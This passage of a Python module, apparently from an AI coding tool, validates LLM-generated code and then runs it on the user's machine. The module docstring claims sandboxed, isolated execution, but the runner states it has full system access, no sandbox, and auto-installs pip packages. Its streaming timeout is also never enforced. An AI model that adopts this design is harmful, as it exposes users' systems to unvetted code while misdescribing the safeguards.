"""
Direct executor module for simple code generation and execution with sandbox verification.

Handles DIRECT mode requests: generate code, verify in sandbox, execute in isolation.
Integrates with SandboxRunManager for robust verification pipeline.
"""

import ast
import logging
import os
import re
import select
import subprocess
import sys
import tempfile
import time
import traceback
from dataclasses import dataclass
from datetime import datetime
from pathlib import Path
from typing import Callable, Dict, Generator, List, Optional, Set

from spectral.gui_test_generator import GUITestGenerator
from spectral.intelligent_retry import IntelligentRetryManager
from spectral.llm_client import LLMClient
from spectral.memory_models import ExecutionMemory
from spectral.mistake_learner import MistakeLearner
from spectral.persistent_memory import MemoryModule
from spectral.retry_parsing import format_attempt_progress, parse_retry_limit
from spectral.utils import (
    AUTONOMOUS_CODE_REQUIREMENT,
    SmartInputHandler,
    clean_code,
    detect_input_calls,
    generate_test_inputs,
    has_input_calls,
)

logger = logging.getLogger(__name__)


@dataclass
class ValidationIssue:
    """Represents a code validation issue."""

    severity: str  # "warning" or "error"
    issue_type: str  # "infinite_loop", "missing_timeout", "blocking_call", etc.
    message: str
    line_number: Optional[int] = None
    suggestion: Optional[str] = None


@dataclass
class ValidationResult:
    """Result of code validation."""

    is_valid: bool
    issues: List[ValidationIssue]
    checks_performed: List[str]

    def has_errors(self) -> bool:
        """Check if validation found any errors (not just warnings)."""
        return any(issue.severity == "error" for issue in self.issues)

    def get_error_messages(self) -> List[str]:
        """Get all error messages."""
        return [issue.message for issue in self.issues if issue.severity == "error"]

    def get_warning_messages(self) -> List[str]:
        """Get all warning messages."""
        return [issue.message for issue in self.issues if issue.severity == "warning"]


class CodeValidator:
    """
    Validates generated code for common issues before execution.

    Performs static analysis to detect:
    - Infinite loops (while True without break/timeout)
    - Missing timeouts on I/O operations
    - Blocking calls (input(), long sleep())
    - Missing structure (functions without returns)
    - Logic errors (unreachable code, undefined variables)
    """

    def __init__(self):
        self.checks_performed: List[str] = []

    def validate(self, code: str) -> ValidationResult:
        """
        Validate code for common issues.

        Args:
            code: Python code to validate

        Returns:
            ValidationResult with detected issues
        """
        self.checks_performed = []
        issues: List[ValidationIssue] = []

        # Try to parse the code as AST
        try:
            tree = ast.parse(code)
        except SyntaxError as e:
            issues.append(
                ValidationIssue(
                    severity="error",
                    issue_type="syntax_error",
                    message=f"Syntax error: {e.msg}",
                    line_number=e.lineno,
                    suggestion="Fix syntax errors before execution",
                )
            )
            return ValidationResult(is_valid=False, issues=issues, checks_performed=["syntax"])

        # Perform all validation checks
        issues.extend(self._check_infinite_loops(tree, code))
        issues.extend(self._check_missing_timeouts(tree, code))
        issues.extend(self._check_blocking_calls(tree, code))
        issues.extend(self._check_missing_returns(tree))
        issues.extend(self._check_unreachable_code(tree))
        issues.extend(self._check_undefined_variables(tree))

        # Determine if code is valid (no errors, warnings are OK)
        has_errors = any(issue.severity == "error" for issue in issues)
        is_valid = not has_errors

        return ValidationResult(
            is_valid=is_valid, issues=issues, checks_performed=self.checks_performed
        )

    def _check_infinite_loops(self, tree: ast.AST, code: str) -> List[ValidationIssue]:
        """Check for infinite loops without break/timeout conditions."""
        self.checks_performed.append("infinite_loops")
        issues: List[ValidationIssue] = []

        class LoopVisitor(ast.NodeVisitor):
            def __init__(self):
                self.issues: List[ValidationIssue] = []

            def visit_While(self, node: ast.While):
                # Check for while True without break
                if isinstance(node.test, ast.Constant) and node.test.value is True:
                    has_break = self._has_break_or_return(node.body)
                    has_timeout_logic = self._has_timeout_logic(node.body)

                    if not has_break and not has_timeout_logic:
                        self.issues.append(
                            ValidationIssue(
                                severity="error",
                                issue_type="infinite_loop",
                                message="Infinite loop detected: 'while True' without break or timeout",
                                line_number=node.lineno,
                                suggestion="Add a break condition, timeout check, or iteration counter",
                            )
                        )
                self.generic_visit(node)

            def visit_For(self, node: ast.For):
                # Check for potentially infinite ranges
                if isinstance(node.iter, ast.Call):
                    if isinstance(node.iter.func, ast.Name) and node.iter.func.id == "range":
                        # Check for very large ranges that might be mistakes
                        if len(node.iter.args) > 0:
                            arg = node.iter.args[0]
                            if isinstance(arg, ast.Constant) and isinstance(arg.value, int):
                                if arg.value > 1000000:  # More than 1M iterations
                                    self.issues.append(
                                        ValidationIssue(
                                            severity="warning",
                                            issue_type="large_loop",
                                            message=f"Very large loop detected: range({arg.value})",
                                            line_number=node.lineno,
                                            suggestion="Consider adding progress indicators or breaking into smaller chunks",
                                        )
                                    )
                self.generic_visit(node)

            def _has_break_or_return(self, body: List[ast.stmt]) -> bool:
                """Check if body contains break or return statement."""
                for node in ast.walk(ast.Module(body=body, type_ignores=[])):
                    if isinstance(node, (ast.Break, ast.Return)):
                        return True
                return False

            def _has_timeout_logic(self, body: List[ast.stmt]) -> bool:
                """Check if body contains timeout-related logic."""
                for node in ast.walk(ast.Module(body=body, type_ignores=[])):
                    # Look for time.time() comparisons or timeout variables
                    if isinstance(node, ast.Compare):
                        for comp in ast.walk(node):
                            if isinstance(comp, ast.Attribute):
                                if comp.attr in ["time", "timeout", "elapsed"]:
                                    return True
                            if isinstance(comp, ast.Name):
                                if comp.id in ["timeout", "start_time", "elapsed", "deadline"]:
                                    return True
                return False

        visitor = LoopVisitor()
        visitor.visit(tree)
        issues.extend(visitor.issues)

        # Also check for recursive functions without clear base case
        issues.extend(self._check_recursive_functions(tree))

        return issues

    def _check_recursive_functions(self, tree: ast.AST) -> List[ValidationIssue]:
        """Check for recursive functions without obvious base case."""
        issues: List[ValidationIssue] = []

        class RecursionVisitor(ast.NodeVisitor):
            def __init__(self):
                self.issues: List[ValidationIssue] = []
                self.current_function: Optional[str] = None

            def visit_FunctionDef(self, node: ast.FunctionDef):
                old_function = self.current_function
                self.current_function = node.name

                # Check if function calls itself
                has_recursive_call = False
                has_base_case = False

                for child in ast.walk(node):
                    if isinstance(child, ast.Call):
                        if isinstance(child.func, ast.Name) and child.func.id == node.name:
                            has_recursive_call = True

                    # Look for return statements (potential base cases)
                    if isinstance(child, ast.Return):
                        has_base_case = True

                if has_recursive_call and not has_base_case:
                    self.issues.append(
                        ValidationIssue(
                            severity="warning",
                            issue_type="recursive_no_base",
                            message=f"Recursive function '{node.name}' may lack base case",
                            line_number=node.lineno,
                            suggestion="Ensure function has clear termination condition",
                        )
                    )

                self.generic_visit(node)
                self.current_function = old_function

        visitor = RecursionVisitor()
        visitor.visit(tree)
        return visitor.issues

    def _check_missing_timeouts(self, tree: ast.AST, code: str) -> List[ValidationIssue]:
        """Check for I/O operations without timeouts."""
        self.checks_performed.append("missing_timeouts")
        issues: List[ValidationIssue] = []

        class TimeoutVisitor(ast.NodeVisitor):
            def __init__(self):
                self.issues: List[ValidationIssue] = []
                self.has_socket_timeout = False

            def visit_Call(self, node: ast.Call):
                # Check for socket operations
                if isinstance(node.func, ast.Attribute):
                    # socket.socket() creation
                    if node.func.attr == "socket":
                        # Look ahead for .settimeout() call
                        self.issues.append(
                            ValidationIssue(
                                severity="warning",
                                issue_type="missing_timeout",
                                message="Socket created without explicit timeout",
                                line_number=node.lineno,
                                suggestion="Add socket.settimeout(timeout_seconds) after creation",
                            )
                        )

                    # socket.connect() without timeout
                    if node.func.attr in ["connect", "accept", "recv", "recvfrom"]:
                        self.issues.append(
                            ValidationIssue(
                                severity="warning",
                                issue_type="missing_timeout",
                                message=f"Socket operation '{node.func.attr}' may block indefinitely",
                                line_number=node.lineno,
                                suggestion="Ensure socket has timeout set with settimeout()",
                            )
                        )

                    # threading operations without timeout
                    if node.func.attr == "join" and not node.args:
                        self.issues.append(
                            ValidationIssue(
                                severity="warning",
                                issue_type="missing_timeout",
                                message="Thread.join() called without timeout",
                                line_number=node.lineno,
                                suggestion="Add timeout parameter: thread.join(timeout=30)",
                            )
                        )

                    # requests library without timeout
                    if node.func.attr in ["get", "post", "put", "delete", "request"]:
                        has_timeout = any(
                            isinstance(kw.value, (ast.Constant, ast.Name)) and kw.arg == "timeout"
                            for kw in node.keywords
                        )
                        if not has_timeout:
                            self.issues.append(
                                ValidationIssue(
                                    severity="warning",
                                    issue_type="missing_timeout",
                                    message=f"HTTP request '{node.func.attr}' without timeout",
                                    line_number=node.lineno,
                                    suggestion="Add timeout parameter: requests.get(url, timeout=10)",
                                )
                            )

                self.generic_visit(node)

        visitor = TimeoutVisitor()
        visitor.visit(tree)
        issues.extend(visitor.issues)

        # Regex check for common blocking patterns
        # Check if code has socket creation but no settimeout() call
        has_socket = re.search(r"socket\.socket\s*\(", code)
        has_timeout = re.search(r"settimeout\s*\(", code)

        if has_socket and not has_timeout:
            # This is a critical error - socket without timeout will block indefinitely
            issues.append(
                ValidationIssue(
                    severity="error",
                    issue_type="missing_timeout",
                    message="Socket code missing timeout configuration",
                    suggestion="Add sock.settimeout(30) after socket creation",
                )
            )

        return issues

    def _check_blocking_calls(self, tree: ast.AST, code: str) -> List[ValidationIssue]:
        """Check for blocking calls that may hang."""
        self.checks_performed.append("blocking_calls")
        issues: List[ValidationIssue] = []

        class BlockingVisitor(ast.NodeVisitor):
            def __init__(self):
                self.issues: List[ValidationIssue] = []

            def visit_Call(self, node: ast.Call):
                # Check for input() calls
                if isinstance(node.func, ast.Name) and node.func.id == "input":
                    self.issues.append(
                        ValidationIssue(
                            severity="error",
                            issue_type="blocking_call",
                            message="input() call detected - will block execution",
                            line_number=node.lineno,
                            suggestion="Replace with hardcoded test value or remove interactive input",
                        )
                    )

                # Check for sleep() with long duration
                if isinstance(node.func, ast.Attribute) and node.func.attr == "sleep":
                    if node.args and isinstance(node.args[0], ast.Constant):
                        sleep_time = node.args[0].value
                        if isinstance(sleep_time, (int, float)) and sleep_time > 5:
                            self.issues.append(
                                ValidationIssue(
                                    severity="warning",
                                    issue_type="blocking_call",
                                    message=f"Long sleep detected: {sleep_time} seconds",
                                    line_number=node.lineno,
                                    suggestion="Consider reducing sleep time or adding progress indicators",
                                )
                            )

                self.generic_visit(node)

        visitor = BlockingVisitor()
        visitor.visit(tree)
        return visitor.issues

    def _check_missing_returns(self, tree: ast.AST) -> List[ValidationIssue]:
        """Check for functions without return statements."""
        self.checks_performed.append("missing_returns")
        issues: List[ValidationIssue] = []

        class ReturnVisitor(ast.NodeVisitor):
            def __init__(self):
                self.issues: List[ValidationIssue] = []

            def visit_FunctionDef(self, node: ast.FunctionDef):
                # Skip special methods and main function
                if node.name.startswith("_") or node.name == "main":
                    self.generic_visit(node)
                    return

                # Check if function has any return statement
                has_return = False
                for child in ast.walk(node):
                    if isinstance(child, ast.Return):
                        has_return = True
                        break

                # Check if function has type hints suggesting it should return something
                if node.returns is not None and not isinstance(node.returns, ast.Constant):
                    if not has_return:
                        self.issues.append(
                            ValidationIssue(
                                severity="warning",
                                issue_type="missing_return",
                                message=f"Function '{node.name}' has return type hint but no return statement",
                                line_number=node.lineno,
                                suggestion="Add explicit return statement",
                            )
                        )

                self.generic_visit(node)

        visitor = ReturnVisitor()
        visitor.visit(tree)
        return visitor.issues

    def _check_unreachable_code(self, tree: ast.AST) -> List[ValidationIssue]:
        """Check for unreachable code after return/break/continue."""
        self.checks_performed.append("unreachable_code")
        issues: List[ValidationIssue] = []

        class UnreachableVisitor(ast.NodeVisitor):
            def __init__(self):
                self.issues: List[ValidationIssue] = []

            def visit_FunctionDef(self, node: ast.FunctionDef):
                self._check_block(node.body)
                self.generic_visit(node)

            def visit_If(self, node: ast.If):
                self._check_block(node.body)
                self._check_block(node.orelse)
                self.generic_visit(node)

            def visit_While(self, node: ast.While):
                self._check_block(node.body)
                self.generic_visit(node)

            def visit_For(self, node: ast.For):
                self._check_block(node.body)
                self.generic_visit(node)

            def _check_block(self, body: List[ast.stmt]):
                """Check a block of statements for unreachable code."""
                for i, stmt in enumerate(body):
                    # If this is a return/break/continue and there's more code after
                    if isinstance(stmt, (ast.Return, ast.Break, ast.Continue)):
                        if i + 1 < len(body):
                            next_stmt = body[i + 1]
                            self.issues.append(
                                ValidationIssue(
                                    severity="warning",
                                    issue_type="unreachable_code",
                                    message="Unreachable code detected after return/break/continue",
                                    line_number=next_stmt.lineno,
                                    suggestion="Remove or restructure unreachable code",
                                )
                            )
                            break

        visitor = UnreachableVisitor()
        visitor.visit(tree)
        return visitor.issues

    def _check_undefined_variables(self, tree: ast.AST) -> List[ValidationIssue]:
        """Check for obvious undefined variable usage."""
        self.checks_performed.append("undefined_variables")
        issues: List[ValidationIssue] = []

        class VariableVisitor(ast.NodeVisitor):
            def __init__(self):
                self.issues: List[ValidationIssue] = []
                self.defined_vars: Set[str] = set()
                self.used_before_def: Set[str] = set()
                self.imported_modules: Set[str] = set()

            def visit_Import(self, node: ast.Import):
                # Track imported modules
                for alias in node.names:
                    name = alias.asname if alias.asname else alias.name
                    self.imported_modules.add(name)
                    self.defined_vars.add(name)
                self.generic_visit(node)

            def visit_ImportFrom(self, node: ast.ImportFrom):
                # Track imported names
                for alias in node.names:
                    name = alias.asname if alias.asname else alias.name
                    self.imported_modules.add(name)
                    self.defined_vars.add(name)
                self.generic_visit(node)

            def visit_FunctionDef(self, node: ast.FunctionDef):
                # Add function name to defined variables
                self.defined_vars.add(node.name)

                # Save current scope
                old_vars = self.defined_vars.copy()

                # Add function parameters to defined variables
                for arg in node.args.args:
                    self.defined_vars.add(arg.arg)

                # Visit function body
                self.generic_visit(node)

                # Restore scope
                self.defined_vars = old_vars

            def visit_For(self, node: ast.For):
                # Add loop variable to defined variables
                if isinstance(node.target, ast.Name):
                    self.defined_vars.add(node.target.id)
                self.generic_visit(node)

            def visit_Assign(self, node: ast.Assign):
                # Mark all assigned names as defined
                for target in node.targets:
                    if isinstance(target, ast.Name):
                        self.defined_vars.add(target.id)
                self.generic_visit(node)

            def visit_AugAssign(self, node: ast.AugAssign):
                # x += 1 requires x to be defined first
                if isinstance(node.target, ast.Name):
                    if (
                        node.target.id not in self.defined_vars
                        and node.target.id not in self.imported_modules
                    ):
                        self.used_before_def.add(node.target.id)
                    self.defined_vars.add(node.target.id)
                self.generic_visit(node)

            def visit_Name(self, node: ast.Name):
                # Check if variable is used before definition
                if isinstance(node.ctx, ast.Load):
                    # Skip common builtins and imports
                    builtins = {
                        "print",
                        "len",
                        "range",
                        "str",
                        "int",
                        "float",
                        "list",
                        "dict",
                        "set",
                        "tuple",
                        "True",
                        "False",
                        "None",
                        "open",
                        "input",
                        "type",
                        "isinstance",
                        "hasattr",
                        "getattr",
                        "setattr",
                        "__name__",
                        "__main__",
                    }
                    if (
                        node.id not in self.defined_vars
                        and node.id not in builtins
                        and node.id not in self.imported_modules
                    ):
                        self.used_before_def.add(node.id)
                self.generic_visit(node)

        visitor = VariableVisitor()
        visitor.visit(tree)

        # Report variables that might be used before definition
        # Filter out common false positives
        for var in visitor.used_before_def:
            # Skip if it looks like it might be a module attribute
            if var in visitor.imported_modules:
                continue

            issues.append(
                ValidationIssue(
                    severity="warning",
                    issue_type="undefined_variable",
                    message=f"Variable '{var}' may be used before definition",
                    suggestion=f"Ensure '{var}' is defined before use",
                )
            )

        return issues

    def suggest_fix(self, code: str, issue: ValidationIssue) -> Optional[str]:
        """
        Suggest a minimal fix for a validation issue.

        Args:
            code: Original code
            issue: Validation issue to fix

        Returns:
            Fixed code or None if no automatic fix available
        """
        if issue.issue_type == "infinite_loop":
            # Add iteration counter to while True loops
            lines = code.split("\n")
            fixed_lines = []
            in_while_true = False
            indent_level = 0

            for i, line in enumerate(lines):
                if "while True:" in line:
                    in_while_true = True
                    indent_level = len(line) - len(line.lstrip())
                    # Add counter before while loop
                    fixed_lines.append(f"{' ' * indent_level}_iteration_count = 0")
                    fixed_lines.append(f"{' ' * indent_level}_max_iterations = 10000")
                    fixed_lines.append(line)
                    # Add counter check inside loop
                    fixed_lines.append(f"{' ' * (indent_level + 4)}_iteration_count += 1")
                    fixed_lines.append(
                        f"{' ' * (indent_level + 4)}if _iteration_count >= _max_iterations:"
                    )
                    fixed_lines.append(f"{' ' * (indent_level + 8)}break")
                    in_while_true = False
                else:
                    fixed_lines.append(line)

            return "\n".join(fixed_lines)

        elif issue.issue_type == "missing_timeout" and "socket" in code.lower():
            # Add socket timeout
            lines = code.split("\n")
            fixed_lines = []

            for line in lines:
                fixed_lines.append(line)
                if "socket.socket(" in line or "socket(" in line:
                    indent = len(line) - len(line.lstrip())
                    # Extract socket variable name
                    match = re.search(r"(\w+)\s*=\s*socket", line)
                    if match:
                        sock_var = match.group(1)
                        fixed_lines.append(f"{' ' * indent}{sock_var}.settimeout(30)")

            return "\n".join(fixed_lines)

        elif issue.issue_type == "blocking_call" and "input()" in code:
            # Replace input() with hardcoded test value
            fixed_code = re.sub(
                r"(\w+)\s*=\s*input\([^)]*\)",
                r'\1 = "test_input"  # Auto-replaced input() call',
                code,
            )
            return fixed_code

        return None


class DirectCodeRunner:
    """
    Runs code directly on user's machine with full system access.

    No sandbox isolation, no temp file restrictions, full pip installation support.
    """

    def __init__(self):
        self.installed_packages: Set[str] = set()

    def detect_missing_imports(self, code: str) -> List[str]:
        """Detect imports that are not available in the current environment."""
        missing_imports = []

        # Common stdlib modules that don't need installation
        stdlib_modules = {
            "os",
            "sys",
            "re",
            "json",
            "time",
            "datetime",
            "pathlib",
            "subprocess",
            "threading",
            "multiprocessing",
            "queue",
            "logging",
            "tempfile",
            "shutil",
            "glob",
            "urllib",
            "http",
            "email",
            "xml",
            "sqlite3",
            "csv",
            "configparser",
            "argparse",
            "getpass",
            "platform",
            "uuid",
            "hashlib",
            "hmac",
            "secrets",
            "base64",
            "binascii",
            "struct",
            "codecs",
            "io",
            "collections",
            "itertools",
            "functools",
            "operator",
            "pickle",
            "copy",
            "pprint",
            "reprlib",
            "enum",
            "abc",
            "contextlib",
            "weakref",
            "types",
            "copyreg",
            "typing",
            "warnings",
            "dataclasses",
            "ast",
            "dis",
            "tkinter",
        }

        # Find all import statements
        import_patterns = [
            r"^import\s+([a-zA-Z_][a-zA-Z0-9_]*)",
            r"^from\s+([a-zA-Z_][a-zA-Z0-9_]*)\s+import",
        ]

        found_imports = set()
        for line in code.split("\n"):
            line = line.strip()
            for pattern in import_patterns:
                match = re.match(pattern, line)
                if match:
                    module_name = match.group(1)
                    if module_name not in stdlib_modules:
                        found_imports.add(module_name)

        # Check which imports are actually missing
        for module in found_imports:
            try:
                __import__(module)
            except ImportError:
                missing_imports.append(module)

        return missing_imports

    def install_missing_packages(self, missing_imports: List[str]) -> bool:
        """Install missing packages using pip."""
        if not missing_imports:
            return True

        logger.info(f"Installing missing packages: {missing_imports}")

        for package in missing_imports:
            try:
                # Map common module names to pip package names
                pip_package = self._get_pip_package_name(package)
                if pip_package and pip_package not in self.installed_packages:
                    logger.info(f"Installing {pip_package} for module {package}")

                    result = subprocess.run(
                        [sys.executable, "-m", "pip", "install", pip_package],
                        capture_output=True,
                        text=True,
                        timeout=120,
                    )

                    if result.returncode == 0:
                        self.installed_packages.add(pip_package)
                        logger.info(f"Successfully installed {pip_package}")
                    else:
                        logger.warning(f"Failed to install {pip_package}: {result.stderr}")
                        return False

            except Exception as e:
                logger.warning(f"Error installing package for {package}: {e}")
                return False

        return True

    def _get_pip_package_name(self, module_name: str) -> Optional[str]:
        """Map module name to pip package name."""
        mapping = {
            "cv2": "opencv-python",
            "PIL": "pillow",
            "bs4": "beautifulsoup4",
            "sklearn": "scikit-learn",
            "yaml": "pyyaml",
            "yaml2": "pyyaml",
            "plotly": "plotly",
            "flask": "flask",
            "django": "django",
            "fastapi": "fastapi",
            "sqlalchemy": "sqlalchemy",
            "pymongo": "pymongo",
            "redis": "redis",
            "celery": "celery",
            "pytest": "pytest",
            "tensorflow": "tensorflow",
            "torch": "torch",
            "keras": "keras",
            "seaborn": "seaborn",
            "requests": "requests",
            "beautifulsoup4": "beautifulsoup4",
            "pygame": "pygame",
            "numpy": "numpy",
            "pandas": "pandas",
            "matplotlib": "matplotlib",
            "jinja2": "jinja2",
            "click": "click",
            "tqdm": "tqdm",
            "psutil": "psutil",
            "paramiko": "paramiko",
            "socket": None,  # Built-in
            "mcstatus": "mcstatus",
        }
        return mapping.get(module_name)

    def run_direct_code_streaming(
        self, code: str, script_path: Optional[Path] = None, timeout: int = 30
    ) -> Generator[str, None, None]:
        """
        Run code directly with streaming output for real-time feedback.

        Args:
            code: Python code to execute
            script_path: Optional path to save script (otherwise uses temp file)
            timeout: Execution timeout in seconds

        Yields:
            Output lines as they arrive
        """

        # Detect and install missing packages
        missing_imports = self.detect_missing_imports(code)
        if missing_imports:
            yield f"📦 Installing missing packages: {', '.join(missing_imports)}\n"
            if not self.install_missing_packages(missing_imports):
                yield f"❌ Failed to install required packages: {missing_imports}\n"
                return

        # Write code to file (Desktop if possible, otherwise temp)
        if script_path is None:
            script_path = self._get_execution_path()

        try:
            script_path.parent.mkdir(parents=True, exist_ok=True)
            script_path.write_text(code, encoding="utf-8")

            yield f"🚀 Executing code directly: {script_path}\n"

            # Execute directly with user's Python interpreter
            creation_flags = 0
            if sys.platform == "win32":
                creation_flags = subprocess.CREATE_NEW_PROCESS_GROUP

            process = subprocess.Popen(
                [sys.executable, str(script_path)],
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                text=True,
                creationflags=creation_flags,
            )

            assert process.stdout is not None
            assert process.stderr is not None

            # Read output in real-time
            while True:
                # Check if there's data to read from stdout
                try:
                    readable, _, _ = select.select([process.stdout], [], [], 0.1)
                    if readable:
                        line = process.stdout.readline()
                        if line:
                            yield f"📤 {line.rstrip()}\n"
                        else:
                            break
                    else:
                        # Check if process has finished
                        if process.poll() is not None:
                            break
                except Exception:
                    # Handle case where stdout is closed
                    break

            # Check stderr too
            try:
                while True:
                    line = process.stderr.readline()
                    if line:
                        yield f"⚠️ {line.rstrip()}\n"
                    else:
                        break
            except Exception:
                pass

            exit_code = process.returncode or 0

            if exit_code == 0:
                yield "✅ Code executed successfully!\n"
            else:
                yield f"❌ Code failed with exit code {exit_code}\n"

        except subprocess.TimeoutExpired:
            yield f"⏰ Execution timed out after {timeout} seconds\n"
            if "process" in locals():
                process.kill()
        except Exception as e:
            yield f"❌ Execution failed: {str(e)}\n"

    def run_direct_code(
        self,
        code: str,
        script_path: Optional[Path] = None,
        timeout: int = 30,
        capture_output: bool = False,
    ) -> tuple[int, str, str]:
        """
        Run code directly with full system access.

        Args:
            code: Python code to execute
            script_path: Optional path to save script (otherwise uses temp file)
            timeout: Execution timeout in seconds
            capture_output: Whether to capture output (True) or stream it (False)

        Returns:
            Tuple of (exit_code, stdout, stderr)
        """

        # Detect and install missing packages
        missing_imports = self.detect_missing_imports(code)
        if missing_imports:
            logger.info(f"Detected missing imports: {missing_imports}")
            if not self.install_missing_packages(missing_imports):
                return 1, "", f"Failed to install required packages: {missing_imports}"

        # Write code to file (Desktop if possible, otherwise temp)
        if script_path is None:
            script_path = self._get_execution_path()

        try:
            script_path.parent.mkdir(parents=True, exist_ok=True)
            script_path.write_text(code, encoding="utf-8")

            logger.info(f"Executing code directly: {script_path}")

            # Execute directly with user's Python interpreter
            creation_flags = 0
            if sys.platform == "win32":
                creation_flags = subprocess.CREATE_NEW_PROCESS_GROUP

            if capture_output:
                result = subprocess.run(
                    [sys.executable, str(script_path)],
                    capture_output=True,
                    text=True,
                    timeout=timeout,
                    creationflags=creation_flags,
                )
                return result.returncode, result.stdout or "", result.stderr or ""
            else:
                proc = subprocess.Popen(
                    [sys.executable, str(script_path)],
                    stdout=subprocess.PIPE,
                    stderr=subprocess.PIPE,
                    text=True,
                    creationflags=creation_flags,
                )
                stdout, stderr = proc.communicate(timeout=timeout)
                return proc.returncode or 0, stdout or "", stderr or ""

        except subprocess.TimeoutExpired:
            logger.warning(f"Code execution timed out after {timeout}s")
            return 124, "", f"Execution timed out after {timeout} seconds"
        except Exception as e:
            logger.error(f"Failed to execute code: {e}")
            return 1, "", f"Execution failed: {str(e)}"

    def _get_execution_path(self) -> Path:
        """Get path for script execution (Desktop preferred, fallback to temp)."""
        try:
            desktop = Path.home() / "Desktop"
            if desktop.exists() and os.access(desktop, os.W_OK):
                timestamp = int(time.time())
                return desktop / f"spectral_direct_{timestamp}.py"
        except Exception:
            pass

        # Fallback to temp directory
        return Path(tempfile.gettempdir()) / f"spectral_direct_{int(time.time())}.py"


class DirectExecutor:
    """
    Executes simple code generation requests directly.

    Flow:
    1. Generate code from user request with learned patterns
    2. Write to file (auto-save to desktop if requested)
    3. Execute and stream output
    4. Learn from any failures
    """

    def __init__(
        self,
        llm_client: LLMClient,
        mistake_learner: Optional[MistakeLearner] = None,
        memory_module: Optional[MemoryModule] = None,
        gui_callback: Optional[Callable[[str, dict], None]] = None,
    ) -> None:
        """
        Initialize direct executor.

        Args:
            llm_client: LLM client for code generation
            mistake_learner: Mistake learner for storing and retrieving patterns
            memory_module: Optional memory module for tracking executions
            gui_callback: Optional callback for sandbox viewer updates
        """
        self.llm_client = llm_client
        self.mistake_learner = mistake_learner or MistakeLearner()
        self.memory_module = memory_module
        self.gui_callback = gui_callback
        self.gui_test_generator = GUITestGenerator(llm_client)

        # Use DirectCodeRunner for unrestricted execution
        self.direct_runner = DirectCodeRunner()
        self.code_validator = CodeValidator()
        self._execution_history: list[ExecutionMemory] = []
        logger.info("DirectExecutor initialized with direct code execution (no sandbox)")

    def _emit_gui_event(self, event_type: str, data: dict) -> None:
        """
        Emit an event to the GUI callback (sandbox viewer).

        Args:
            event_type: Type of event
            data: Event data dictionary
        """
        if self.gui_callback:
            try:
                # Add timestamp to all events for better tracking
                from datetime import datetime

                if "timestamp" not in data:
                    data["timestamp"] = datetime.now().isoformat()

                self.gui_callback(event_type, data)
                logger.debug(f"GUI event emitted: {event_type} with data: {data}")
            except Exception as e:
                logger.debug(f"GUI callback error: {e}")

    def generate_code(
        self, user_request: str, language: str = "python", target_filename: Optional[str] = None
    ) -> str:
        """
        Generate code from user request with learned patterns.

        Args:
            user_request: User's natural language request
            language: Programming language (default: python)
            target_filename: Optional target filename for path construction

        Returns:
            Generated code as string
        """
        logger.info(f"Generating {language} code for: {user_request}")

        # Emit code generation started event
        self._emit_gui_event("code_generation_started", {})

        # Detect desktop save request
        save_to_desktop = self._detect_desktop_save_request(user_request)
        tags = ["general"]

        if save_to_desktop:
            tags.append("file_ops")
            tags.append("desktop")

        # Query learned patterns
        learned_patterns = self.mistake_learner.get_patterns_for_generation(tags=tags)

        # Build prompt with target filename context if available
        prompt = self._build_code_generation_prompt(user_request, language, learned_patterns)

        if target_filename:
            prompt += f"\n\nIMPORTANT: The user wants to save this as '{target_filename}'. "
            prompt += "Make sure to use this filename in any internal references or save logic."

        try:
            code = self.llm_client.generate(prompt)
            # Clean markdown formatting from generated code
            cleaned_code = clean_code(str(code))

            # Handle desktop save request
            if save_to_desktop:
                cleaned_code = self._modify_for_desktop_save(cleaned_code, user_request)

            logger.debug(f"Generated {len(cleaned_code)} characters of {language} code")

            # Emit code generated event to sandbox viewer
            self._emit_gui_event("code_generated", {"code": cleaned_code})
            self._emit_gui_event("code_generation_complete", {})

            return str(cleaned_code)
        except Exception as e:
            logger.error(f"Failed to generate code: {e}")
            self._emit_gui_event("error_occurred", {"error": str(e)})
            raise

    def write_execution_script(
        self,
        code: str,
        filename: Optional[str] = None,
        directory: Optional[Path] = None,
    ) -> Path:
        """
        Write generated code to a file.

        Args:
            code: Code content to write
            filename: Optional filename (auto-generated if not provided)
            directory: Optional directory (uses temp dir if not provided)

        Returns:
            Path to the written file
        """
        if directory is None:
            directory = Path(tempfile.gettempdir())

        if filename is None:
            # Auto-generate filename with timestamp
            timestamp = int(time.time())
            filename = f"spectral_script_{timestamp}.py"

        file_path = directory / filename
        file_path = file_path.resolve()

        logger.info(f"Writing script to: {file_path}")

        try:
            # Create directory if it doesn't exist
            directory.mkdir(parents=True, exist_ok=True)

            with open(file_path, "w", encoding="utf-8") as f:
                f.write(code)

            logger.info(f"Successfully wrote script to {file_path}")
            return file_path
        except Exception as e:
            logger.error(f"Failed to write script: {e}")
            raise

    def save_code_to_desktop(
        self,
        code: str,
        user_request: str,
        script_path: Optional[Path] = None,
        filename: Optional[str] = None,
    ) -> Path:
        """
        Save generated code to Desktop with timestamp.

        IMPORTANT: Saves the actual Python code, not execution output.

        Args:
            code: Code content to save (actual Python code)
            user_request: Original user request (for generating filename)
            script_path: Optional existing script path to copy from
            filename: Optional specific filename to use

        Returns:
            Path to the saved file on Desktop
        """
        # Generate filename from user request if not provided
        desktop = Path.home() / "Desktop"
        if not filename:
            filename = self._generate_safe_filename(user_request) + ".py"

        file_path = desktop / filename

        try:
            # If we have an existing script, copy it
            if script_path and script_path.exists():
                import shutil

                shutil.copy2(script_path, file_path)
                logger.info(f"Copied script to Desktop: {file_path}")
            else:
                # Write actual Python code directly (NOT code_with_prompts, NOT execution output)
                with open(file_path, "w", encoding="utf-8") as f:
                    f.write(code)
                logger.info(f"Saved Python code to Desktop: {file_path}")

            return file_path
        except Exception as e:
            logger.error(f"Failed to save code to Desktop: {e}")
            # Fallback to temp directory
            fallback_path = Path(tempfile.gettempdir()) / filename
            with open(fallback_path, "w", encoding="utf-8") as f:
                f.write(code)
            logger.info(f"Saved to temp instead: {fallback_path}")
            return fallback_path

    def _generate_safe_filename(self, user_request: str) -> str:
        """
        Generate a safe filename from user request.

        Args:
            user_request: Original user request

        Returns:
            Safe filename string
        """
        # Extract key words from request
        request_lower = user_request.lower()

        # Remove common phrases
        for phrase in [
            "write a program that",
            "create a program",
            "write me",
            "create",
            "generate",
            "python program",
            "python script",
            "script that",
            "program that",
        ]:
            request_lower = request_lower.replace(phrase, "")

        # Extract alphanumeric words
        words = re.findall(r"[a-z0-9]+", request_lower)

        # Take first 5 meaningful words
        meaningful_words = [w for w in words if len(w) > 2][:5]

        if not meaningful_words:
            return f"spectral_script_{int(time.time())}"

        return "spectral_" + "_".join(meaningful_words)

    def execute_with_input_support(
        self,
        script_path: Path,
